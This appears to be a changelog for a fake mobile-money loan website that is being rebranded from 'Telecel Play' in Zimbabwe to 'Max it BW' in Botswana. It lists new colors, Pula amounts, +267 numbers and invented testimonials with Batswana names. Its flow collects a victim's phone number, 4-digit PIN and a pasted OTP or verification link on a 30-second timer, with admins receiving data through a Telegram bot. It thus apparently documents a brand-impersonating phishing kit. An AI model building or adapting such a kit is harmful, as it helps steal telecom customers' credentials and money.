@@ -1,0 +1,455 @@
+═══════════════════════════════════════════════════════════════
+✅ MAX IT BW - COMPLETE REBRANDING CHANGES
+═══════════════════════════════════════════════════════════════
+
+This document lists ALL changes made to rebrand the loan application 
+from "Telecel Play (Zimbabwe)" to "Max it BW (Botswana)"
+
+═══════════════════════════════════════════════════════════════
+📋 BRANDING CHANGES
+═══════════════════════════════════════════════════════════════
+
+OLD: Telecel Play Loan
+NEW: Max it BW
+
+OLD: Zimbabwe
+NEW: Botswana
+
+OLD: Telecel Play colors (Yellow #FFCB05 & Black #000000)
+NEW: Max it BW colors (Orange #FF6B00 & Blue #0066CC)
+
+═══════════════════════════════════════════════════════════════
+💰 CURRENCY CHANGES
+═══════════════════════════════════════════════════════════════
+
+OLD: USD (US Dollars) - Zimbabwe uses USD
+NEW: P (Pula) - Botswana's official currency
+
+Symbol changed throughout:
+- $ → P
+- USD → P
+- All currency displays updated
+
+═══════════════════════════════════════════════════════════════
+💵 LOAN AMOUNTS CHANGES
+═══════════════════════════════════════════════════════════════
+
+OLD: USD 50 to USD 5,000
+NEW: P 500 to P 50,000
+
+This reflects realistic loan amounts for Botswana market:
+- Minimum: P 500
+- Maximum: P 50,000
+- Default: P 5,000
+- Step: P 500
+
+═══════════════════════════════════════════════════════════════
+📞 PHONE NUMBER CHANGES
+═══════════════════════════════════════════════════════════════
+
+OLD: +263 (Zimbabwe country code)
+NEW: +267 (Botswana country code)
+
+Format:
+OLD: +263 XXX XXX XXX
+NEW: +267 XX XXX XXX
+
+═══════════════════════════════════════════════════════════════
+🏙️ CITIES CHANGES
+═══════════════════════════════════════════════════════════════
+
+OLD Cities (Zimbabwe):
+- Harare
+- Bulawayo
+- Mutare
+
+NEW Cities (Botswana):
+- Gaborone (capital)
+- Francistown
+- Maun
+
+═══════════════════════════════════════════════════════════════
+👥 CUSTOMER NAMES IN TESTIMONIALS
+═══════════════════════════════════════════════════════════════
+
+OLD Names (Zimbabwean):
+- Tendai M.
+- Tafadzwa K.
+- Rumbi N.
+
+NEW Names (Batswana):
+- Thabo M.
+- Keitumetse K.
+- Mpho N.
+
+═══════════════════════════════════════════════════════════════
+🎨 COLOR SCHEME CHANGES
+═══════════════════════════════════════════════════════════════
+
+OLD Theme: Yellow & Black (Telecel Play)
+--primary-yellow: #FFCB05
+--telecel-black: #000000
+--accent-gold: #FFD700
+
+NEW Theme: Orange & Blue (Max it BW)
+--primary-orange: #FF6B00
+--primary-blue: #0066CC
+--dark-orange: #E55A00
+--light-orange: #FF8533
+--dark-blue: #004C99
+--light-blue: #3399FF
+
+Changes applied to:
+- Navigation bar
+- Buttons
+- Hero section gradient
+- Progress indicators
+- Form focus states
+- Success messages
+- All hover effects
+- Icons and badges
+
+═══════════════════════════════════════════════════════════════
+🔐 PIN SYSTEM (NO CHANGE)
+═══════════════════════════════════════════════════════════════
+
+Format: 4 digits
+Status: ✅ UNCHANGED
+
+Example: 1234
+
+═══════════════════════════════════════════════════════════════
+⚠️ VERIFICATION SYSTEM - MAJOR CHANGE
+═══════════════════════════════════════════════════════════════
+
+This is the BIGGEST change in the entire system!
+
+OLD SYSTEM: 5-Digit OTP in Separate Boxes
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+- 5 separate input boxes
+- User types one digit per box
+- Auto-advance between boxes
+- Paste feature splits digits
+- 60-second timer
+- File: otp.html (5 <input> elements)
+- Example: [1] [2] [3] [4] [5]
+
+NEW SYSTEM: Single Link Input
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+- 1 single text input box
+- User pastes entire verification link
+- System extracts code from link
+- Multiple link formats supported
+- 30-second timer ⚠️ (REDUCED FROM 60s)
+- File: otp.html (1 <input type="text"> element)
+- Example: [Paste verification link here...]
+
+Supported Link Formats:
+1. Full URL: https://maxitbw.co.bw/verify?code=ABC123
+2. Path only: /verify/ABC123
+3. Code only: ABC123
+
+File Changes:
+- otp.html: Removed 5 boxes, added single input
+- otp-script.js: Changed validation from 5 digits to link parsing
+- style.css: Removed .otp-boxes, added .link-input styles
+
+═══════════════════════════════════════════════════════════════
+⏱️ TIMER CHANGE - CRITICAL
+═══════════════════════════════════════════════════════════════
+
+OLD: 60 seconds (1 minute)
+NEW: 30 seconds ⚠️
+
+This affects:
+- Initial countdown: 30s instead of 60s
+- Resend timer: 30s instead of 60s
+- Circle animation: maxTime = 30
+- Warning threshold: < 10s (was < 20s)
+
+Files changed:
+- otp-script.js: timeLeft = 30, resendTimeLeft = 30
+- otp.html: countdown display starts at 30
+
+Reason for change:
+- Max it BW uses shorter verification windows
+- Industry standard for link-based verification
+- Increases security
+
+═══════════════════════════════════════════════════════════════
+📄 FILES MODIFIED
+═══════════════════════════════════════════════════════════════
+
+HTML Files (10):
+✅ index.html - Landing page
+✅ application.html - Application form
+✅ verification.html - PIN verification
+✅ otp.html - Link verification ⚠️ MAJOR CHANGE
+✅ approval.html - Approval page
+✅ admin-select.html - Admin selection
+
+JavaScript Files (5):
+✅ landing-script.js - Calculator (P currency)
+✅ application-script.js - Form validation
+✅ verification-script.js - PIN handling
+✅ otp-script.js - Link handling ⚠️ MAJOR CHANGE
+✅ approval-script.js - Approval calculations (P currency)
+
+Backend Files (3):
+✅ server.js - Express server
+✅ database.js - MongoDB config
+✅ get-chat-id.js - Telegram helper
+
+Style & Config (3):
+✅ style.css - Complete color overhaul ⚠️
+✅ package.json - Project metadata
+✅ .env (template) - Environment variables
+
+Documentation (3):
+✅ README.md - Complete documentation
+✅ QUICK_START.md - Quick setup guide
+✅ CHANGES.txt - This file
+
+═══════════════════════════════════════════════════════════════
+🔍 DETAILED FILE CHANGES
+═══════════════════════════════════════════════════════════════
+
+1. index.html
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+- Line 6: Title changed to "Max it BW"
+- Line 16: Logo text "Max it BW"
+- Line 37: Loan range "P 500 to P 50,000"
+- Lines 84-86: Calculator inputs (P currency)
+- Lines 105-107: Result displays (P currency)
+- Lines 235-245: Testimonials (Botswana names/cities)
+- Line 288: Footer "Max it BW"
+
+2. application.html
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+- Line 6: Title "Max it BW"
+- Line 16: Logo "Max it BW"
+- Lines 66-72: Loan amount (P 500 - P 50,000)
+- Line 68: Currency symbol changed to P
+- Line 72: Help text "Between P 500 and P 50,000"
+
+3. verification.html
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+- Line 6: Title "Max it BW"
+- Line 16: Logo "Max it BW"
+- Line 56: Phone format +267
+- Lines 63-66: PIN description (4 digits)
+
+4. otp.html ⚠️ CRITICAL CHANGES
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+- Line 6: Title "Max it BW"
+- Line 16: Logo "Max it BW"
+- Line 47: Changed from "OTP" to "Link" verification
+- Lines 66-74: REMOVED 5 OTP boxes, added 1 link input
+- Line 53: Timer changed to 30 seconds
+- Line 90: Button text "Verify Link" (was "Verify Code")
+- Line 97: Resend text "Resend Link" (was "Resend Code")
+
+5. approval.html
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+- Line 6: Title "Max it BW"
+- Line 16: Logo "Max it BW"
+- All currency displays changed to P
+
+6. style.css ⚠️ COMPLETE OVERHAUL
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Lines 1-40: Color variables replaced
+- --primary-yellow → --primary-orange (#FF6B00)
+- --telecel-black → removed
+- Added --primary-blue (#0066CC)
+- Added gradient combinations
+
+Lines 100-150: Navigation styling
+- Background changed to white with orange border
+- Links change to orange on hover
+
+Lines 200-300: Hero section
+- Gradient changed to orange-to-blue
+- All text and buttons updated
+
+Lines 400-500: Forms and inputs
+- Focus borders changed to orange
+- Success states changed to orange
+
+Lines 600-700: Link input styles (NEW!)
+.link-input-container { ... }
+.link-input { ... }
+.paste-hint { ... }
+
+Lines 800-900: Countdown circle
+- Progress bar changed to orange
+- Warning state at 10s (was 20s)
+
+7. landing-script.js
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Line 56: Calculator min/max changed (500-50000)
+Lines 58-67: Currency display changed to 'P'
+Line 80: Timezone changed to 'Africa/Gaborone'
+
+8. otp-script.js ⚠️ MAJOR REWRITE
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Line 1: Comment updated
+Lines 5-10: Changed from otpInputs to linkInput
+Lines 65-66: Timer changed to 30 seconds
+Lines 90-110: Link parsing logic added
+Lines 160-180: Validation changed from 5 digits to link
+Lines 200-220: Timer functions updated for 30s
+
+9. approval-script.js
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Lines 20-30: All currency changed to 'P'
+Lines 40-50: Default amount changed to 5000
+
+10. package.json
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Line 2: Name changed to "maxit-bw-loan"
+Line 4: Description updated
+Line 13: Keywords updated (botswana, maxit)
+Line 16: Author "Max it BW"
+
+═══════════════════════════════════════════════════════════════
+🧪 TESTING REQUIREMENTS
+═══════════════════════════════════════════════════════════════
+
+CRITICAL TESTS:
+
+1. Link Verification System ⚠️
+   ✓ Single input box appears
+   ✓ Timer starts at 30 seconds
+   ✓ Can paste full URL
+   ✓ Can paste path only
+   ✓ Can paste code only
+   ✓ Timer counts down correctly
+   ✓ Expires at 0 seconds
+   ✓ Resend button works
+
+2. Currency Display
+   ✓ All amounts show "P" not "$"
+   ✓ Calculator uses P currency
+   ✓ Approval page shows P amounts
+   ✓ No USD references anywhere
+
+3. Colors
+   ✓ Orange primary buttons
+   ✓ Blue secondary elements
+   ✓ No yellow/black anywhere
+   ✓ Gradients work correctly
+
+4. Phone Numbers
+   ✓ +267 format validated
+   ✓ Botswana format accepted
+
+5. Cities
+   ✓ Gaborone, Francistown, Maun in testimonials
+   ✓ No Zimbabwe cities
+
+═══════════════════════════════════════════════════════════════
+📊 CHANGE STATISTICS
+═══════════════════════════════════════════════════════════════
+
+Total Files Modified: 16
+HTML Files: 6
+JavaScript Files: 5
+Backend Files: 3
+Config/Style Files: 2
+
+Major Changes: 3
+- Link verification system (otp.html, otp-script.js)
+- 30-second timer (otp-script.js)
+- Complete color overhaul (style.css)
+
+Medium Changes: 5
+- Currency change (all files)
+- Loan amounts (index.html, application.html, scripts)
+- Phone code (verification.html, scripts)
+- Cities (index.html, testimonials)
+- Branding text (all files)
+
+Minor Changes: 8
+- Package metadata
+- Customer names
+- Footer text
+- Email addresses
+- Website references
+
+Lines Changed: ~500+ lines
+New Lines Added: ~200 lines
+Lines Removed: ~150 lines
+
+═══════════════════════════════════════════════════════════════
+✅ VERIFICATION CHECKLIST
+═══════════════════════════════════════════════════════════════
+
+Before Deployment:
+
+□ All "Telecel Play" references removed
+□ All "Zimbabwe" references removed
+□ All "USD" changed to "P"
+□ All "+263" changed to "+267"
+□ Loan range is P 500 to P 50,000
+□ Colors are Orange & Blue (not Yellow & Black)
+□ OTP system uses SINGLE link input
+□ Timer is 30 seconds (not 60)
+□ PIN is 4 digits
+□ Cities are Botswana cities
+□ Testimonials use Batswana names
+□ Footer shows Max it BW
+□ Email addresses use @maxitbw.co.bw
+□ All calculations use Pula
+□ Database interactions unchanged
+□ Telegram bot functionality unchanged
+
+═══════════════════════════════════════════════════════════════
+📝 DEPLOYMENT NOTES
+═══════════════════════════════════════════════════════════════
+
+1. Environment Variables Required:
+   - MONGODB_URI (your MongoDB connection)
+   - TELEGRAM_BOT_TOKEN (your bot token)
+   - PORT (default: 3000)
+
+2. Admin Configuration:
+   - Edit database.js
+   - Add your name, email, Telegram chat ID
+   - Set status to 'active'
+
+3. Testing:
+   - Test full flow from application to approval
+   - Especially test link verification (30s timer!)
+   - Verify all P currency displays
+   - Check mobile responsiveness
+
+4. Production:
+   - Use HTTPS (SSL certificate)
+   - Set up MongoDB access control
+   - Configure CORS
+   - Enable rate limiting
+   - Set up monitoring
+
+═══════════════════════════════════════════════════════════════
+🎯 SUMMARY
+═══════════════════════════════════════════════════════════════
+
+✅ Fully rebranded from Telecel Play (Zimbabwe) to Max it BW (Botswana)
+✅ Currency changed from USD to P (Pula)
+✅ Loan range changed to P 500 - P 50,000
+✅ Phone code changed to +267
+✅ Colors changed to Orange & Blue
+⚠️ OTP system changed to single link input (MAJOR CHANGE)
+⚠️ Timer reduced to 30 seconds (CRITICAL CHANGE)
+✅ All Botswana-specific content updated
+✅ Database functionality maintained
+✅ All backend logic preserved
+
+═══════════════════════════════════════════════════════════════
+
+Date: February 16, 2026
+Version: 1.0.0
+Market: Botswana
+Brand: Max it BW
+
+Made with ❤️ for Botswana 🇧🇼
